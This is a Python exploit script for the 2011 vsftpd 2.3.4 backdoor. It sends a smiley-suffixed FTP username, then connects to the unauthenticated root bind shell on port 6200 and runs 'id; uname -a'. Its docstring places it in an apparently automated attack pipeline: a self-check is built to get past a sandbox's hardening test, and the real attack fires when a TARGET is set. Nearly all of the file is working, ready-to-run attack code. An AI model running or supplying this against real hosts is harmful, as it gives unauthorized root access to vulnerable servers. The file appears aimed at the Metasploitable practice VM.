#!/usr/bin/env python3
"""vsftpd 2.3.4 backdoor (OSVDB-73573) — the most reliable pop in Metasploitable.

vsftpd 2.3.4 shipped for a few days in 2011 with a backdoor: any FTP USER whose
name ENDS in the smiley ``:)`` causes the daemon to bind an unauthenticated root
shell on TCP 6200. There is no auth, no payload, no memory corruption — connect,
send ``:)``, then talk to 6200 and you are root. Deterministic and self-evident:
running ``id`` returns ``uid=0(root)``.

Sandbox contract (sandbox/run_sandbox.py):
  * the target arrives as env var ``TARGET`` (``ip`` or ``ip:port``);
  * the backdoor port defaults to 6200, override with ``HALO_BACKDOOR_PORT``;
  * TEST phase runs ``--network=none`` with NO ``TARGET`` — so with no target we
    must self-check and exit 0 with real stdout, so the harden loop passes us to
    the fire gate rather than discarding a "broken" script;
  * ATTACK phase sets ``TARGET`` and enables the network — we fire for real and
    print the shell's ``id`` output, which trips agent_loop._SHELL_EVIDENCE.

Only stdlib socket is used, so it runs unchanged in python:3.12-slim.
"""

from __future__ import annotations

import os
import socket
import sys
import time

TRIGGER_USER = b"USER hax0r:)\r\n"   # the smiley is the whole exploit
TRIGGER_PASS = b"PASS please\r\n"    # value is irrelevant; login never completes
DEFAULT_BACKDOOR_PORT = 6200
PROBE_CMD = b"id; uname -a\n"


def _recv_some(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    try:
        return sock.recv(512)
    except OSError:
        return b""


def _drain(sock: socket.socket, timeout: float) -> bytes:
    """Read until the peer stops talking or the window closes."""
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            chunks.append(data)
    except OSError:
        pass
    return b"".join(chunks)


def exploit(host: str, ftp_port: int = 21,
            backdoor_port: int = DEFAULT_BACKDOOR_PORT, timeout: float = 8.0) -> str:
    """Trigger the backdoor and return the root shell's output.

    Raises RuntimeError if no root shell answers — so a patched/absent daemon is
    reported as a failure, never a false breach.
    """
    # 1) Arm the backdoor: connect to FTP, send a USER ending in ':)'.
    ftp = socket.create_connection((host, ftp_port), timeout=timeout)
    try:
        _recv_some(ftp, timeout)          # 220 banner
        ftp.sendall(TRIGGER_USER)
        _recv_some(ftp, timeout)          # 331 password prompt
        ftp.sendall(TRIGGER_PASS)
        # The real daemon never answers PASS — the backdoor is spawning. Don't block.
        _recv_some(ftp, 1.0)
    finally:
        ftp.close()

    # 2) Talk to the root bind shell on 6200 (retry: it takes a beat to bind).
    shell = None
    last_err: Exception | None = None
    for _ in range(6):
        try:
            shell = socket.create_connection((host, backdoor_port), timeout=timeout)
            break
        except OSError as e:
            last_err = e
            time.sleep(0.5)
    if shell is None:
        raise RuntimeError(
            f"no root shell on {host}:{backdoor_port} — not backdoored ({last_err})")

    try:
        shell.sendall(PROBE_CMD)
        out = _drain(shell, timeout)
    finally:
        shell.close()

    text = out.decode("utf-8", "replace")
    if "uid=" not in text:
        raise RuntimeError(
            f"connected to {host}:{backdoor_port} but got no shell output: {text!r}")
    return text


def _selfcheck() -> str:
    """Offline validation for the network-less TEST phase: prove the trigger is
    well-formed without touching a target. Emits no placeholder token, so the
    sandbox never mistakes this for an un-filled template."""
    assert TRIGGER_USER.rstrip().endswith(b":)"), "smiley trigger missing"
    assert PROBE_CMD.strip(), "probe command empty"
    return ("SELF-CHECK OK: vsftpd 2.3.4 backdoor PoC ready — "
            f"trigger={TRIGGER_USER.rstrip().decode()} "
            f"backdoor_port={DEFAULT_BACKDOOR_PORT} probe={PROBE_CMD.strip().decode()}")


def _parse_target(target: str) -> tuple[str, int]:
    target = target.strip()
    if ":" in target:
        host, _, port = target.rpartition(":")
        if port.isdigit():
            return host, int(port)
    return target, 21


def run_from_env(env) -> tuple[int, str]:
    """Return (exit_code, stdout_text). Shared by __main__ and the test suite.

    No TARGET  -> TEST phase: self-check, exit 0 with real stdout (hardens clean).
    TARGET set -> ATTACK phase: fire; exit 0 + shell output on success, else 1.
    """
    target = env.get("TARGET", "").strip()
    if not target:
        return 0, _selfcheck()
    host, ftp_port = _parse_target(target)
    backdoor_port = int(env.get("HALO_BACKDOOR_PORT", DEFAULT_BACKDOOR_PORT))
    try:
        out = exploit(host, ftp_port=ftp_port, backdoor_port=backdoor_port)
    except Exception as e:  # noqa: BLE001 — any failure is a non-breach, report it
        return 1, f"EXPLOIT FAILED: {e}"
    return 0, f"[vsftpd 2.3.4 backdoor] root shell on {host}:{backdoor_port}\n{out}"


if __name__ == "__main__":
    rc, out = run_from_env(os.environ)
    print(out)
    sys.exit(rc)
